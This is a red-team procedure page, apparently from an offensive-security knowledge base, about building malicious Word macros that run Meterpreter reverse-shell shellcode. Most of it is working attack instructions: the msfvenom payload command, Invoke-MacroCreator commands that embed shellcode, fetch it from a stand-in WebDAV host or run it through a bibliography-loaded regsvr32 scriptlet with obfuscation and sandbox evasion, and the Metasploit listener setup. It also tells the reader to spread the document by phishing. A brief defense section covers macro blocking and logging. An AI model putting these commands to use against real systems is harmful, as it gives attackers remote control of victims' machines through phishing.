---
type: procedure
description: >-
  Create and deliver Meterpreter shellcode via Office macros using various
  embedding and covert channel methods.
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command and Scripting Interpreter|T1059 - Command and Scripting
    Interpreter]]
  - '[[techniques/Scripting|T1064 - Scripting]]'
sub_techniques:
  - '[[sub-techniques/Visual Basic|T1059.005 - Visual Basic]]'
tags:
  - macro-creator
  - office-attacks
commands:
  - '[[commands/invoke-macrocreator-embed-shellcode-in-word-body]]'
  - '[[commands/invoke-macrocreator-deliver-shellcode-via-webdav]]'
  - '[[commands/invoke-macrocreator-deliver-scriptlet-via-bibliography]]'
tools:
  - '[[tools/Invoke-MacroCreator]]'
platforms:
  - Windows
skill_level: intermediate
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# Macro-Delivery-of-Meterpreter-Shellcode

## Summary

This procedure outlines how to create malicious Office macros that deliver and execute Meterpreter shellcode on a target Windows system. Using the Invoke-MacroCreator PowerShell tool, attackers can embed shellcode directly into document bodies, deliver it over WebDAV covert channels, or use bibliography sources for scriptlet delivery, all while optionally applying obfuscation and sandbox evasion techniques to bypass detection.

## Description

In targeted attacks, macros in Microsoft Office documents (e.g., Word .docm files) are a common vector for initial access and execution. This procedure leverages Invoke-MacroCreator to generate VBA macros that load Meterpreter shellcode, a Metasploit payload providing remote code execution and post-exploitation capabilities. The shellcode is typically a raw binary file generated from msfvenom. Delivery methods include direct embedding for self-contained documents, WebDAV for remote payload retrieval to reduce document size and evade static analysis, and bibliography covert channels for executing scriptlets like regsvr32.sct. Obfuscation renames variables and strings in the VBA code, while sandbox evasion adds checks for virtual environments. This targets Windows environments with Office installed, assuming user interaction to enable macros. Success grants a Meterpreter session for further exploitation, such as privilege escalation or lateral movement.

## Requirements

1. Windows system with PowerShell 5.0+ and Microsoft Office (Word) installed for testing.
2. Invoke-MacroCreator tool installed (PowerShell module or script).
3. Meterpreter shellcode file (e.g., generated via msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > meterpreter_shellcode.raw).
4. For WebDAV/bibliography methods: Attacker-controlled WebDAV server or HTTP server hosting sources.xml and payloads (e.g., regsvr32.sct).
5. Administrative privileges on the attacker's machine for tool setup; user-level access on target for macro execution.

## Defense

- Disable macros by default in Office via Group Policy (Block all except digitally signed).
- Enable Office macro antivirus scanning and behavioral analysis (e.g., via Microsoft Defender or EDR tools like CrowdStrike).
- Monitor for suspicious VBA execution via PowerShell logging (ModuleLogging, ScriptBlockLogging) and ETW events for Office processes.
- Block WebDAV traffic (ports 80/443 to untrusted servers) and inspect bibliography sources in documents.
- User training to avoid enabling macros in unsolicited documents; implement application whitelisting to prevent regsvr32 execution.

## Objectives

1. Generate a malicious Office document with an embedded or remotely delivered Meterpreter macro.
2. Obfuscate and evade detection mechanisms to ensure macro execution.
3. Establish a Meterpreter reverse shell upon user enabling the macro, providing remote access to the target system.

## Instructions

### Step 1: Prepare the Shellcode Payload

**Context**: Generate or obtain the Meterpreter shellcode file, which serves as the payload to be embedded or delivered by the macro. This step ensures the raw binary is ready for use in subsequent macro creation.

Use msfvenom to create the shellcode if not already available.

**Expected Output**: A raw binary file (e.g., meterpreter_shellcode.raw) containing the encoded payload.

### Step 2: Embed Shellcode Directly in Word Document Body

**Context**: This method embeds the shellcode directly into the Word document's macro, creating a self-contained .docm file. No external dependencies are needed, but the file size increases, potentially triggering size-based detections. Use this for simple, offline delivery via email or USB.

**Command** ([[commands/invoke-macrocreator-embed-shellcode-in-word-body]]):
```powershell
Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -d body
```

> This command generates a Word document with the macro in the body section. No obfuscation or evasion is applied here for simplicity; add -o and -e flags if needed. The output file (e.g., malicious.docm) will prompt the user to enable macros upon opening.

**Expected Output**: A .docm file created in the current directory, containing the VBA macro with embedded shellcode. Upon execution, it decodes and runs the shellcode in memory.

### Step 3: Deliver Shellcode via WebDAV Covert Channel

**Context**: For scenarios where direct embedding is risky, this method fetches the shellcode from an attacker-controlled WebDAV server at runtime. Obfuscation is enabled to hide strings and logic in the VBA code, reducing static detection rates. Ideal for phishing campaigns where document size must be minimized.

Set up a WebDAV server (e.g., using Apache with mod_dav) hosting the shellcode file.

**Command** ([[commands/invoke-macrocreator-deliver-shellcode-via-webdav]]):
```powershell
Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -url webdavserver.com -d webdav -o
```

> The -url points to the WebDAV endpoint (e.g., http://webdavserver.com/shellcode.raw). The macro will download and execute the shellcode when enabled. Test the URL accessibility from the target network.

**Expected Output**: A .docm file with an obfuscated macro that retrieves shellcode from the specified WebDAV URL. Execution establishes the Meterpreter session without embedding the payload statically.

### Step 4: Deliver Scriptlet via Bibliography Source Covert Channel

**Context**: This advanced method uses Word's bibliography feature to load an external XML source containing a scriptlet (e.g., regsvr32.sct), which executes the payload via regsvr32. Both obfuscation and sandbox evasion (e.g., checking for mouse movement or VM artifacts) are applied. Use this for high-evasion needs against advanced EDR.

Prepare regsvr32.sct (a signed scriptlet payload) and host sources.xml on an HTTP server with the scriptlet reference.

**Command** ([[commands/invoke-macrocreator-deliver-scriptlet-via-bibliography]]):
```powershell
Invoke-MacroCreator -i regsvr32.sct -t file -url 'http://my.server.com/sources.xml' -d biblio -c 'regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll' -o -e
```

> The -c flag specifies the execution command for the scriptlet. The bibliography source loads the XML, which triggers regsvr32 to run the .sct file, ultimately executing the shellcode. Verify the server hosts the files correctly.

**Expected Output**: A .docm file with an obfuscated, evasion-enabled macro using bibliography to execute the scriptlet. Upon enabling, it bypasses sandboxes and establishes the Meterpreter session.

### Step 5: Deliver and Test the Malicious Document

**Context**: Distribute the generated .docm file via phishing or social engineering, then verify execution on a test target. Monitor for successful callback to the attacker's listener (e.g., msfconsole with multi/handler).

Start a Metasploit listener: use multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST <IP>; set LPORT <PORT>; exploit.

Deliver the document and enable macros on the target.

**Expected Output**: Incoming Meterpreter session in the listener, confirming shellcode execution and remote access.
